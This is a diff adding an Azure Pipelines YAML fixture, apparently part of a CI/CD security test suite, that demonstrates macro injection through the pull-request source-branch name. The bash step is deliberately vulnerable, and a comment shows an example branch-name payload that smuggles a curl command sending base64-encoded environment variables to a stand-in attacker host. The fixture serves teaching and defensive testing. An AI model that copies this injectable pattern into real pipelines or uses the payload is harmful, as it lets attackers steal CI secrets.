@@ -1,0 +1,29 @@
+# scenarios/49-azure-macro-injection
+# CICD-SEC-4 (Poisoned Pipeline Execution) — Azure Pipelines
+#
+# Pattern: a macro variable $(...) that resolves at RUNTIME from untrusted
+# input is interpolated straight into a shell/script task. Macro expansion is
+# plain substring substitution into the generated script with no filtering, so
+# an attacker who controls the value (the PR source-branch name here, or a
+# queue-time variable) controls shell syntax. Pulse Security demonstrated this
+# with low-privilege "run pipeline" users.
+#
+# SAFETY: static fixture, nested under scenarios/ — Azure only runs a pipeline
+# explicitly configured to point at a YAML path, never a nested one. `trigger`/
+# `pr: none` are belt-and-suspenders. See README.md.
+
+trigger: none
+pr: none
+
+pool:
+  vmImage: ubuntu-latest
+
+steps:
+  - task: Bash@3
+    inputs:
+      targetType: inline
+      # DANGER — $(System.PullRequest.SourceBranch) is attacker-controlled
+      # (PR source branch) and is spliced into the script before bash runs.
+      # Branch  "x"; curl https://attacker.tld/$(env|base64) #  -> command exec.
+      script: |
+        echo "Building branch $(System.PullRequest.SourceBranch)"
